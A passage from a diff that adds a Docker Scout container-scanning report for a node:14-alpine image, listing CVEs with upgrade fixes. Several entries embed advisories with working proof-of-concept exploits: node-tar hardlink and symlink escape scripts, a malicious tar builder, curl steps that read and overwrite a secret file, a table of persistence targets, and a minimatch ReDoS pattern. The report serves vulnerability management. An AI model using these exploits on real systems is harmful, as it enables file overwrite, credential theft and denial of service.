+          "version": "5.1.0"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2024-21538",
+          "value": "CVE-2024-21538",
+          "url": "https://scout.docker.com/v/CVE-2024-21538?s=github&n=cross-spawn&t=npm&vr=%3C6.0.6"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2024-21538?s=github&n=cross-spawn&t=npm&vr=%3C6.0.6"
+        }
+      ]
+    },
+    {
+      "id": "a8372de634738c9368f3a41ce08590dd90b712f2b85d971a771a8708a2be1129",
+      "category": "container_scanning",
+      "message": "CVE-2024-29415 on ip@1.1.5",
+      "description": "The ip package through 2.0.1 for Node.js might allow SSRF because some IP addresses (such as 127.1, 01200034567, 012.1.2.3, 000:0:0000::01, and ::fFFf:127.0.0.1) are improperly categorized as globally routable via isPublic. NOTE: this issue exists because of an incomplete fix for CVE-2023-42282.",
+      "cve": "CVE-2024-29415",
+      "severity": "High",
+      "confidence": "Unknown",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:npm/ip@1.1.5"
+          },
+          "version": "1.1.5"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2024-29415",
+          "value": "CVE-2024-29415",
+          "url": "https://scout.docker.com/v/CVE-2024-29415?s=github&n=ip&t=npm&vr=%3C%3D2.0.1"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2024-29415?s=github&n=ip&t=npm&vr=%3C%3D2.0.1"
+        }
+      ]
+    },
+    {
+      "id": "f0cb2764010bb6d8d0b58586ea2e3f181c10b0bf3e682277c2009a7f74084d6b",
+      "category": "container_scanning",
+      "message": "CVE-2025-26519 on alpine/musl@1.2.3-r4",
+      "cve": "CVE-2025-26519",
+      "severity": "High",
+      "confidence": "Unknown",
+      "solution": "Upgrade alpine/musl@1.2.3-r4 to 1.2.3-r6",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/musl@1.2.3-r4?os_name=alpine&os_version=3.17"
+          },
+          "version": "1.2.3-r4"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2025-26519",
+          "value": "CVE-2025-26519",
+          "url": "https://scout.docker.com/v/CVE-2025-26519?s=alpine&n=musl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C1.2.3-r6"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2025-26519?s=alpine&n=musl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C1.2.3-r6"
+        }
+      ]
+    },
+    {
+      "id": "758223f51a97258d4f925e60c612e760a30c405c22352c7c411bbfca52801cf8",
+      "category": "container_scanning",
+      "message": "CVE-2026-23745 on tar@4.4.19",
+      "description": "### Summary\n\nThe `node-tar` library (`<= 7.5.2`) fails to sanitize the `linkpath` of `Link` (hardlink) and `SymbolicLink` entries when `preservePaths` is false (the default secure behavior). This allows malicious archives to bypass the extraction root restriction, leading to **Arbitrary File Overwrite** via hardlinks and **Symlink Poisoning** via absolute symlink targets.\n\n### Details\n\nThe vulnerability exists in `src/unpack.ts` within the `[HARDLINK]` and `[SYMLINK]` methods.\n\n**1. Hardlink Escape (Arbitrary File Overwrite)**\n\nThe extraction logic uses `path.resolve(this.cwd, entry.linkpath)` to determine the hardlink target. Standard Node.js behavior dictates that if the second argument (`entry.linkpath`) is an **absolute path**, `path.resolve` ignores the first argument (`this.cwd`) entirely and returns the absolute path.\n\nThe library fails to validate that this resolved target remains within the extraction root. A malicious archive can create a hardlink to a sensitive file on the host (e.g., `/etc/passwd`) and subsequently write to it, if file permissions allow writing to the target file, bypassing path-based security measures that may be in place.\n\n**2. Symlink Poisoning**\n\nThe extraction logic passes the user-supplied `entry.linkpath` directly to `fs.symlink` without validation. This allows the creation of symbolic links pointing to sensitive absolute system paths or traversing paths (`../../`), even when secure extraction defaults are used.\n\n### PoC\n\nThe following script generates a binary TAR archive containing malicious headers (a hardlink to a local file and a symlink to `/etc/passwd`). It then extracts the archive using standard `node-tar` settings and demonstrates the vulnerability by verifying that the local \"secret\" file was successfully overwritten.\n\n```javascript\nconst fs = require('fs')\nconst path = require('path')\nconst tar = require('tar')\n\nconst out = path.resolve('out_repro')\nconst secret = path.resolve('secret.txt')\nconst tarFile = path.resolve('exploit.tar')\nconst targetSym = '/etc/passwd'\n\n// Cleanup & Setup\ntry { fs.rmSync(out, {recursive:true, force:true}); fs.unlinkSync(secret) } catch {}\nfs.mkdirSync(out)\nfs.writeFileSync(secret, 'ORIGINAL_DATA')\n\n// 1. Craft malicious Link header (Hardlink to absolute local file)\nconst h1 = new tar.Header({\n  path: 'exploit_hard',\n  type: 'Link',\n  size: 0,\n  linkpath: secret \n})\nh1.encode()\n\n// 2. Craft malicious Symlink header (Symlink to /etc/passwd)\nconst h2 = new tar.Header({\n  path: 'exploit_sym',\n  type: 'SymbolicLink',\n  size: 0,\n  linkpath: targetSym \n})\nh2.encode()\n\n// Write binary tar\nfs.writeFileSync(tarFile, Buffer.concat([ h1.block, h2.block, Buffer.alloc(1024) ]))\n\nconsole.log('[*] Extracting malicious tarball...')\n\n// 3. Extract with default secure settings\ntar.x({\n  cwd: out,\n  file: tarFile,\n  preservePaths: false\n}).then(() => {\n  console.log('[*] Verifying payload...')\n\n  // Test Hardlink Overwrite\n  try {\n    fs.writeFileSync(path.join(out, 'exploit_hard'), 'OVERWRITTEN')\n    \n    if (fs.readFileSync(secret, 'utf8') === 'OVERWRITTEN') {\n      console.log('[+] VULN CONFIRMED: Hardlink overwrite successful')\n    } else {\n      console.log('[-] Hardlink failed')\n    }\n  } catch (e) {}\n\n  // Test Symlink Poisoning\n  try {\n    if (fs.readlinkSync(path.join(out, 'exploit_sym')) === targetSym) {\n      console.log('[+] VULN CONFIRMED: Symlink points to absolute path')\n    } else {\n      console.log('[-] Symlink failed')\n    }\n  } catch (e) {}\n})\n\n```\n\n### Impact\n\n* **Arbitrary File Overwrite:** An attacker can overwrite any file the extraction process has access to, bypassing path-based security restrictions. It does not grant write access to files that the extraction process does not otherwise have access to, such as root-owned configuration files.\n* **Remote Code Execution (RCE):** In CI/CD environments or automated pipelines, overwriting configuration files, scripts, or binaries leads to code execution. (However, npm is unaffected, as it filters out all `Link` and `SymbolicLink` tar entries from extracted packages.)",
+      "cve": "CVE-2026-23745",
+      "severity": "High",
+      "confidence": "Unknown",
+      "solution": "Upgrade tar@4.4.19 to 7.5.3",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:npm/tar@4.4.19"
+          },
+          "version": "4.4.19"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2026-23745",
+          "value": "CVE-2026-23745",
+          "url": "https://scout.docker.com/v/CVE-2026-23745?s=github&n=tar&t=npm&vr=%3C%3D7.5.2"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2026-23745?s=github&n=tar&t=npm&vr=%3C%3D7.5.2"
+        }
+      ]
+    },
+    {
+      "id": "5f918b7f2f93c3eb3bf247977ec2fd879c18758b8f7dec289da8ef2f0ef786f3",
+      "category": "container_scanning",
+      "message": "CVE-2026-24842 on tar@4.4.19",
+      "description": "### Summary\nnode-tar contains a vulnerability where the security check for hardlink entries uses different path resolution semantics than the actual hardlink creation logic. This mismatch allows an attacker to craft a malicious TAR archive that bypasses path traversal protections and creates hardlinks to arbitrary files outside the extraction directory.\n\n### Details\nThe vulnerability exists in `lib/unpack.js`. When extracting a hardlink, two functions handle the linkpath differently:\n\n**Security check in `[STRIPABSOLUTEPATH]`:**\n```javascript\nconst entryDir = path.posix.dirname(entry.path);\nconst resolved = path.posix.normalize(path.posix.join(entryDir, linkpath));\nif (resolved.startsWith('../')) { /* block */ }\n```\n\n**Hardlink creation in `[HARDLINK]`:**\n```javascript\nconst linkpath = path.resolve(this.cwd, entry.linkpath);\nfs.linkSync(linkpath, dest);\n```\n\n**Example:** An application extracts a TAR using `tar.extract({ cwd: '/var/app/uploads/' })`. The TAR contains entry `a/b/c/d/x` as a hardlink to `../../../../etc/passwd`.\n\n- **Security check** resolves the linkpath relative to the entry's parent directory: `a/b/c/d/ + ../../../../etc/passwd` = `etc/passwd`. No `../` prefix, so it **passes**.\n\n- **Hardlink creation** resolves the linkpath relative to the extraction directory (`this.cwd`): `/var/app/uploads/ + ../../../../etc/passwd` = `/etc/passwd`. This **escapes** to the system's `/etc/passwd`.\n\nThe security check and hardlink creation use different starting points (entry directory `a/b/c/d/` vs extraction directory `/var/app/uploads/`), so the same linkpath can pass validation but still escape. The deeper the entry path, the more levels an attacker can escape.\n\n### PoC\n#### Setup\n\nCreate a new directory with these files:\n\n```\npoc/\n├── package.json\n├── secret.txt          ← sensitive file (target)\n├── server.js           ← vulnerable server\n├── create-malicious-tar.js\n├── verify.js\n└── uploads/            ← created automatically by server.js\n    └── (extracted files go here)\n```\n\n**package.json**\n```json\n{ \"dependencies\": { \"tar\": \"^7.5.0\" } }\n```\n\n**secret.txt** (sensitive file outside uploads/)\n```\nDATABASE_PASSWORD=supersecret123\n```\n\n**server.js** (vulnerable file upload server)\n```javascript\nconst http = require('http');\nconst fs = require('fs');\nconst path = require('path');\nconst tar = require('tar');\n\nconst PORT = 3000;\nconst UPLOAD_DIR = path.join(__dirname, 'uploads');\nfs.mkdirSync(UPLOAD_DIR, { recursive: true });\n\nhttp.createServer((req, res) => {\n  if (req.method === 'POST' && req.url === '/upload') {\n    const chunks = [];\n    req.on('data', c => chunks.push(c));\n    req.on('end', async () => {\n      fs.writeFileSync(path.join(UPLOAD_DIR, 'upload.tar'), Buffer.concat(chunks));\n      await tar.extract({ file: path.join(UPLOAD_DIR, 'upload.tar'), cwd: UPLOAD_DIR });\n      res.end('Extracted\\n');\n    });\n  } else if (req.method === 'GET' && req.url === '/read') {\n    // Simulates app serving extracted files (e.g., file download, static assets)\n    const targetPath = path.join(UPLOAD_DIR, 'd', 'x');\n    if (fs.existsSync(targetPath)) {\n      res.end(fs.readFileSync(targetPath));\n    } else {\n      res.end('File not found\\n');\n    }\n  } else if (req.method === 'POST' && req.url === '/write') {\n    // Simulates app writing to extracted file (e.g., config update, log append)\n    const chunks = [];\n    req.on('data', c => chunks.push(c));\n    req.on('end', () => {\n      const targetPath = path.join(UPLOAD_DIR, 'd', 'x');\n      if (fs.existsSync(targetPath)) {\n        fs.writeFileSync(targetPath, Buffer.concat(chunks));\n        res.end('Written\\n');\n      } else {\n        res.end('File not found\\n');\n      }\n    });\n  } else {\n    res.end('POST /upload, GET /read, or POST /write\\n');\n  }\n}).listen(PORT, () => console.log(`http://localhost:${PORT}`));\n```\n\n**create-malicious-tar.js** (attacker creates exploit TAR)\n```javascript\nconst fs = require('fs');\n\nfunction tarHeader(name, type, linkpath = '', size = 0) {\n  const b = Buffer.alloc(512, 0);\n  b.write(name, 0); b.write('0000644', 100); b.write('0000000', 108);\n  b.write('0000000', 116); b.write(size.toString(8).padStart(11, '0'), 124);\n  b.write(Math.floor(Date.now()/1000).toString(8).padStart(11, '0'), 136);\n  b.write('        ', 148);\n  b[156] = type === 'dir' ? 53 : type === 'link' ? 49 : 48;\n  if (linkpath) b.write(linkpath, 157);\n  b.write('ustar\\x00', 257); b.write('00', 263);\n  let sum = 0; for (let i = 0; i < 512; i++) sum += b[i];\n  b.write(sum.toString(8).padStart(6, '0') + '\\x00 ', 148);\n  return b;\n}\n\n// Hardlink escapes to parent directory's secret.txt\nfs.writeFileSync('malicious.tar', Buffer.concat([\n  tarHeader('d/', 'dir'),\n  tarHeader('d/x', 'link', '../secret.txt'),\n  Buffer.alloc(1024)\n]));\nconsole.log('Created malicious.tar');\n```\n\n#### Run\n\n```bash\n# Setup\nnpm install\necho \"DATABASE_PASSWORD=supersecret123\" > secret.txt\n\n# Terminal 1: Start server\nnode server.js\n\n# Terminal 2: Execute attack\nnode create-malicious-tar.js\ncurl -X POST --data-binary @malicious.tar http://localhost:3000/upload\n\n# READ ATTACK: Steal secret.txt content via the hardlink\ncurl http://localhost:3000/read\n# Returns: DATABASE_PASSWORD=supersecret123\n\n# WRITE ATTACK: Overwrite secret.txt through the hardlink\ncurl -X POST -d \"PWNED\" http://localhost:3000/write\n\n# Confirm secret.txt was modified\ncat secret.txt\n```\n### Impact\n\nAn attacker can craft a malicious TAR archive that, when extracted by an application using node-tar, creates hardlinks that escape the extraction directory. This enables:\n\n**Immediate (Read Attack):** If the application serves extracted files, attacker can read any file readable by the process.\n\n**Conditional (Write Attack):** If the application later writes to the hardlink path, it modifies the target file outside the extraction directory.\n\n### Remote Code Execution / Server Takeover\n\n| Attack Vector | Target File | Result |\n|--------------|-------------|--------|\n| SSH Access | `~/.ssh/authorized_keys` | Direct shell access to server |\n| Cron Backdoor | `/etc/cron.d/*`, `~/.crontab` | Persistent code execution |\n| Shell RC Files | `~/.bashrc`, `~/.profile` | Code execution on user login |\n| Web App Backdoor | Application `.js`, `.php`, `.py` files | Immediate RCE via web requests |\n| Systemd Services | `/etc/systemd/system/*.service` | Code execution on service restart |\n| User Creation | `/etc/passwd` (if running as root) | Add new privileged user |\n\n## Data Exfiltration & Corruption\n\n1. **Overwrite arbitrary files** via hardlink escape + subsequent write operations\n2. **Read sensitive files** by creating hardlinks that point outside extraction directory\n3. **Corrupt databases** and application state\n4. **Steal credentials** from config files, `.env`, secrets",
+      "cve": "CVE-2026-24842",
+      "severity": "High",
+      "confidence": "Unknown",
+      "solution": "Upgrade tar@4.4.19 to 7.5.7",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:npm/tar@4.4.19"
+          },
+          "version": "4.4.19"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2026-24842",
+          "value": "CVE-2026-24842",
+          "url": "https://scout.docker.com/v/CVE-2026-24842?s=github&n=tar&t=npm&vr=%3C7.5.7"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2026-24842?s=github&n=tar&t=npm&vr=%3C7.5.7"
+        }
+      ]
+    },
+    {
+      "id": "c5d07db385e828f45d2074987ecfb45bbdc5a2333ea36f3bd134060ff9ee07b0",
+      "category": "container_scanning",
+      "message": "CVE-2026-29786 on tar@4.4.19",
+      "description": "### Summary\n`tar` (npm) can be tricked into creating a hardlink that points outside the extraction directory by using a drive-relative link target such as `C:../target.txt`, which enables file overwrite outside `cwd` during normal `tar.x()` extraction.\n\n### Details\nThe extraction logic in `Unpack[STRIPABSOLUTEPATH]` checks for `..` segments *before* stripping absolute roots.\n\nWhat happens with `linkpath: \"C:../target.txt\"`:\n1. Split on `/` gives `['C:..', 'target.txt']`, so `parts.includes('..')` is false.\n2. `stripAbsolutePath()` removes `C:` and rewrites the value to `../target.txt`.\n3. Hardlink creation resolves this against extraction `cwd` and escapes one directory up.\n4. Writing through the extracted hardlink overwrites the outside file.\n\nThis is reachable in standard usage (`tar.x({ cwd, file })`) when extracting attacker-controlled tar archives.\n\n### PoC\nTested on Arch Linux with `tar@7.5.9`.\n\nPoC script (`poc.cjs`):\n\n```js\nconst fs = require('fs')\nconst path = require('path')\nconst { Header, x } = require('tar')\n\nconst cwd = process.cwd()\nconst target = path.resolve(cwd, '..', 'target.txt')\nconst tarFile = path.join(process.cwd(), 'poc.tar')\n\nfs.writeFileSync(target, 'ORIGINAL\\n')\n\nconst b = Buffer.alloc(1536)\nnew Header({ path: 'l', type: 'Link', linkpath: 'C:../target.txt' }).encode(b, 0)\nfs.writeFileSync(tarFile, b)\n\nx({ cwd, file: tarFile }).then(() => {\n  fs.writeFileSync(path.join(cwd, 'l'), 'PWNED\\n')\n  process.stdout.write(fs.readFileSync(target, 'utf8'))\n})\n```\n\nRun:\n\n```bash\ncd test-workspace\nnode poc.cjs && ls -l ../target.txt\n```\n\nObserved output:\n\n```text\nPWNED\n-rw-r--r-- 2 joshuavr joshuavr 6 Mar  4 19:25 ../target.txt\n```\n\n`PWNED` confirms outside file content overwrite. Link count `2` confirms the extracted file and `../target.txt` are hardlinked.\n\n### Impact\nThis is an arbitrary file overwrite primitive outside the intended extraction root, with the permissions of the process performing extraction.\n\nRealistic scenarios:\n- CLI tools unpacking untrusted tarballs into a working directory\n- build/update pipelines consuming third-party archives\n- services that import user-supplied tar files",
+      "cve": "CVE-2026-29786",
+      "severity": "High",
+      "confidence": "Unknown",
+      "solution": "Upgrade tar@4.4.19 to 7.5.10",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:npm/tar@4.4.19"
+          },
+          "version": "4.4.19"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2026-29786",
+          "value": "CVE-2026-29786",
+          "url": "https://scout.docker.com/v/CVE-2026-29786?s=github&n=tar&t=npm&vr=%3C%3D7.5.9"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2026-29786?s=github&n=tar&t=npm&vr=%3C%3D7.5.9"
+        }
+      ]
+    },
+    {
+      "id": "03714cce9596aaa7fad76c291fb677f5d6f5f156cc160be741cbaac16348b067",
+      "category": "container_scanning",
+      "message": "CVE-2026-31802 on tar@4.4.19",
+      "description": "### Summary\n`tar` (npm) can be tricked into creating a symlink that points outside the extraction directory by using a drive-relative symlink target such as `C:../../../target.txt`, which enables file overwrite outside `cwd` during normal `tar.x()` extraction.\n\n### Details\nThe extraction logic in `Unpack[STRIPABSOLUTEPATH]` validates `..` segments against a resolved path that still uses the original drive-relative value, and only afterwards rewrites the stored `linkpath` to the stripped value.\n\nWhat happens with `linkpath: \"C:../../../target.txt\"`:\n1. `stripAbsolutePath()` removes `C:` and rewrites the value to `../../../target.txt`.\n2. The escape check resolves using the original pre-stripped value, so it is treated as in-bounds and accepted.\n3. Symlink creation uses the rewritten value (`../../../target.txt`) from nested path `a/b/l`.\n4. Writing through the extracted symlink overwrites the outside file (`../target.txt`).\n\nThis is reachable in standard usage (`tar.x({ cwd, file })`) when extracting attacker-controlled tar archives.\n\n### PoC\nTested on Arch Linux with `tar@7.5.10`.\n\nPoC script (`poc.cjs`):\n\n```js\nconst fs = require('fs')\nconst path = require('path')\nconst { Header, x } = require('tar')\n\nconst cwd = process.cwd()\nconst target = path.resolve(cwd, '..', 'target.txt')\nconst tarFile = path.join(cwd, 'poc.tar')\n\nfs.writeFileSync(target, 'ORIGINAL\\n')\n\nconst b = Buffer.alloc(1536)\nnew Header({\n  path: 'a/b/l',\n  type: 'SymbolicLink',\n  linkpath: 'C:../../../target.txt',\n}).encode(b, 0)\nfs.writeFileSync(tarFile, b)\n\nx({ cwd, file: tarFile }).then(() => {\n  fs.writeFileSync(path.join(cwd, 'a/b/l'), 'PWNED\\n')\n  process.stdout.write(fs.readFileSync(target, 'utf8'))\n})\n```\n\nRun:\n\n```bash\nnode poc.cjs && readlink a/b/l && ls -l a/b/l ../target.txt\n```\n\nObserved output:\n\n```text\nPWNED\n../../../target.txt\nlrwxrwxrwx - joshuavr  7 Mar 18:37 󰡯 a/b/l -> ../../../target.txt\n.rw-r--r-- 6 joshuavr  7 Mar 18:37  ../target.txt\n```\n\n`PWNED` confirms outside file content overwrite. `readlink` and `ls -l` confirm the extracted symlink points outside the extraction directory.\n\n### Impact\nThis is an arbitrary file overwrite primitive outside the intended extraction root, with the permissions of the process performing extraction.\n\nRealistic scenarios:\n- CLI tools unpacking untrusted tarballs into a working directory\n- build/update pipelines consuming third-party archives\n- services that import user-supplied tar files",
+      "cve": "CVE-2026-31802",
+      "severity": "High",
+      "confidence": "Unknown",
+      "solution": "Upgrade tar@4.4.19 to 7.5.11",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:npm/tar@4.4.19"
+          },
+          "version": "4.4.19"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2026-31802",
+          "value": "CVE-2026-31802",
+          "url": "https://scout.docker.com/v/CVE-2026-31802?s=github&n=tar&t=npm&vr=%3C%3D7.5.10"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2026-31802?s=github&n=tar&t=npm&vr=%3C%3D7.5.10"
+        }
+      ]
+    },
+    {
+      "id": "af129d6b70e7f1e965d03823fb722bab006dd58c9fa1e906486b47c3b2ce969c",
+      "category": "container_scanning",
+      "message": "CVE-2026-26996 on minimatch@3.1.2",
+      "description": "### Summary\n`minimatch` is vulnerable to Regular Expression Denial of Service (ReDoS) when a glob pattern contains many consecutive `*` wildcards followed by a literal character that doesn't appear in the test string. Each `*` compiles to a separate `[^/]*?` regex group, and when the match fails, V8's regex engine backtracks exponentially across all possible splits.\n\nThe time complexity is O(4^N) where N is the number of `*` characters. With N=15, a single `minimatch()` call takes ~2 seconds. With N=34, it hangs effectively forever.\n\n\n### Details\n_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._\n\n### PoC\nWhen minimatch compiles a glob pattern, each `*` becomes `[^/]*?` in the generated regex. For a pattern like `***************X***`:\n\n```\n/^(?!\\.)[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?X[^/]*?[^/]*?[^/]*?$/\n```\n\nWhen the test string doesn't contain `X`, the regex engine must try every possible way to distribute the characters across all the `[^/]*?` groups before concluding no match exists. With N groups and M characters, this is O(C(N+M, N)) — exponential.\n### Impact\nAny application that passes user-controlled strings to `minimatch()` as the pattern argument is vulnerable to DoS. This includes:\n- File search/filter UIs that accept glob patterns\n- `.gitignore`-style filtering with user-defined rules\n- Build tools that accept glob configuration\n- Any API that exposes glob matching to untrusted input\n\n----\n\nThanks to @ljharb for back-porting the fix to legacy versions of minimatch.",
+      "cve": "CVE-2026-26996",
+      "severity": "High",
+      "confidence": "Unknown",
+      "solution": "Upgrade minimatch@3.1.2 to 10.2.1",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:npm/minimatch@3.1.2"
+          },
+          "version": "3.1.2"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2026-26996",
+          "value": "CVE-2026-26996",
+          "url": "https://scout.docker.com/v/CVE-2026-26996?s=github&n=minimatch&t=npm&vr=%3C3.1.3"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2026-26996?s=github&n=minimatch&t=npm&vr=%3C3.1.3"
+        }
+      ]
+    },
+    {
+      "id": "f50967930155b867379b01a10e57541ec019f4bc9f7b7df5e67cfc6b1bf4fedc",
+      "category": "container_scanning",
+      "message": "CVE-2025-15467 on alpine/openssl@3.0.8-r3",
+      "cve": "CVE-2025-15467",
+      "severity": "High",
+      "confidence": "Unknown",
+      "solution": "Upgrade alpine/openssl@3.0.8-r3 to 3.0.19-r0",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/openssl@3.0.8-r3?os_name=alpine&os_version=3.17"
+          },
+          "version": "3.0.8-r3"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2025-15467",
+          "value": "CVE-2025-15467",
+          "url": "https://scout.docker.com/v/CVE-2025-15467?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.19-r0"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2025-15467?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.19-r0"
+        }
+      ]
+    },
+    {
+      "id": "28cad9aa306aa67ffe88d50197e337495b2e83e60ac62c818ccd34d1d2edaf1a",
+      "category": "container_scanning",
+      "message": "CVE-2026-23950 on tar@4.4.19",
+      "description": "**TITLE**: Race Condition in node-tar Path Reservations via Unicode Sharp-S (ß) Collisions on macOS APFS\n\n**AUTHOR**: Tomás Illuminati\n\n### Details\n\nA race condition vulnerability exists in `node-tar` (v7.5.3) this is to an incomplete handling of Unicode path collisions in the `path-reservations` system. On case-insensitive or normalization-insensitive filesystems (such as macOS APFS, In which it has been tested), the library fails to lock colliding paths (e.g., `ß` and `ss`), allowing them to be processed in parallel. This bypasses the library's internal concurrency safeguards and permits Symlink Poisoning attacks via race conditions. The library uses a `PathReservations` system to ensure that metadata checks and file operations for the same path are serialized. This prevents race conditions where one entry might clobber another concurrently.\n\n```typescript\n// node-tar/src/path-reservations.ts (Lines 53-62)\nreserve(paths: string[], fn: Handler) {\n    paths =\n      isWindows ?\n        ['win32 parallelization disabled']\n      : paths.map(p => {\n          return stripTrailingSlashes(\n            join(normalizeUnicode(p)), // <- THE PROBLEM FOR MacOS FS\n          ).toLowerCase()\n        })\n\n```\n\nIn MacOS the ```join(normalizeUnicode(p)), ``` FS confuses ß with ss, but this code does not. For example:\n\n``````bash\nbash-3.2$ printf \"CONTENT_SS\\n\" > collision_test_ss\nbash-3.2$ ls\ncollision_test_ss\nbash-3.2$ printf \"CONTENT_ESSZETT\\n\" > collision_test_ß\nbash-3.2$ ls -la\ntotal 8\ndrwxr-xr-x   3 testuser  staff    96 Jan 19 01:25 .\ndrwxr-x---+ 82 testuser  staff  2624 Jan 19 01:25 ..\n-rw-r--r--   1 testuser  staff    16 Jan 19 01:26 collision_test_ss\nbash-3.2$ \n``````\n\n---\n\n### PoC\n\n``````javascript\nconst tar = require('tar');\nconst fs = require('fs');\nconst path = require('path');\nconst { PassThrough } = require('stream');\n\nconst exploitDir = path.resolve('race_exploit_dir');\nif (fs.existsSync(exploitDir)) fs.rmSync(exploitDir, { recursive: true, force: true });\nfs.mkdirSync(exploitDir);\n\nconsole.log('[*] Testing...');\nconsole.log(`[*] Extraction target: ${exploitDir}`);\n\n// Construct stream\nconst stream = new PassThrough();\n\nconst contentA = 'A'.repeat(1000);\nconst contentB = 'B'.repeat(1000);\n\n// Key 1: \"f_ss\"\nconst header1 = new tar.Header({\n    path: 'collision_ss',\n    mode: 0o644,\n    size: contentA.length,\n});\nheader1.encode();\n\n// Key 2: \"f_ß\"\nconst header2 = new tar.Header({\n    path: 'collision_ß',\n    mode: 0o644,\n    size: contentB.length,\n});\nheader2.encode();\n\n// Write to stream\nstream.write(header1.block);\nstream.write(contentA);\nstream.write(Buffer.alloc(512 - (contentA.length % 512))); // Padding\n\nstream.write(header2.block);\nstream.write(contentB);\nstream.write(Buffer.alloc(512 - (contentB.length % 512))); // Padding\n\n// End\nstream.write(Buffer.alloc(1024));\nstream.end();\n\n// Extract\nconst extract = new tar.Unpack({\n    cwd: exploitDir,\n    // Ensure jobs is high enough to allow parallel processing if locks fail\n    jobs: 8 \n});\n\nstream.pipe(extract);\n\nextract.on('end', () => {\n    console.log('[*] Extraction complete');\n\n    // Check what exists\n    const files = fs.readdirSync(exploitDir);\n    console.log('[*] Files in exploit dir:', files);\n    files.forEach(f => {\n        const p = path.join(exploitDir, f);\n        const stat = fs.statSync(p);\n        const content = fs.readFileSync(p, 'utf8');\n        console.log(`File: ${f}, Inode: ${stat.ino}, Content: ${content.substring(0, 10)}... (Length: ${content.length})`);\n    });\n\n    if (files.length === 1 || (files.length === 2 && fs.statSync(path.join(exploitDir, files[0])).ino === fs.statSync(path.join(exploitDir, files[1])).ino)) {\n        console.log('\\[*] GOOD');\n    } else {\n        console.log('[-] No collision');\n    }\n});\n\n``````\n\n---\n\n### Impact\nThis is a **Race Condition** which enables **Arbitrary File Overwrite**. This vulnerability affects users and systems using **node-tar on macOS (APFS/HFS+)**. Because of using `NFD` Unicode normalization (in which `ß` and `ss` are different), conflicting paths do not have their order properly preserved under filesystems that ignore Unicode normalization (e.g., APFS (in which `ß` causes an inode collision with `ss`)). This enables an attacker to circumvent internal parallelization locks (`PathReservations`) using conflicting filenames within a malicious tar archive.\n\n---\n\n### Remediation\n\nUpdate `path-reservations.js` to use a normalization form that matches the target filesystem's behavior (e.g., `NFKD`), followed by first `toLocaleLowerCase('en')` and then `toLocaleUpperCase('en')`.\n\nUsers who cannot upgrade promptly, and who are programmatically using `node-tar` to extract arbitrary tarball data should filter out all `SymbolicLink` entries (as npm does) to defend against arbitrary file writes via this file system entry name collision issue.\n\n---",
+      "cve": "CVE-2026-23950",
+      "severity": "High",
+      "confidence": "Unknown",
+      "solution": "Upgrade tar@4.4.19 to 7.5.4",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:npm/tar@4.4.19"
+          },
+          "version": "4.4.19"
+        },
